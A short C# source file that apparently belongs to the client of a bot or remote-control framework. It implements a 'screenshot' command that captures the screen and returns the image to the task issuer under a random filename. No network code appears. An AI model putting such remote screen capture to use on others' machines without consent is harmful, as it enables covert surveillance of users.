using pattaya_project_client.Commands.Interfaces;
using pattaya_project_client.Models;
using pattaya_project_client.Services;
using System.IO;

namespace pattaya_project_client.Commands.Implements
{
    public class ScreenShot : BotCommand
    {
        public override string TaskName => "screenshot";

        public override BotTaskResult RunTask(BotTask task)
        {
            string fileName = Path.GetRandomFileName(); 
            fileName = Path.ChangeExtension(fileName, ".png");
            fileName = string.Concat("screen_", fileName);

            return new BotTaskResult
            {
                TaskId = task.TaskId,
                Result = $"Screenshoting... ",
                RespondingFile = Draw.Cap(),
                RespondingFilename = fileName
            };
        }
    }
}
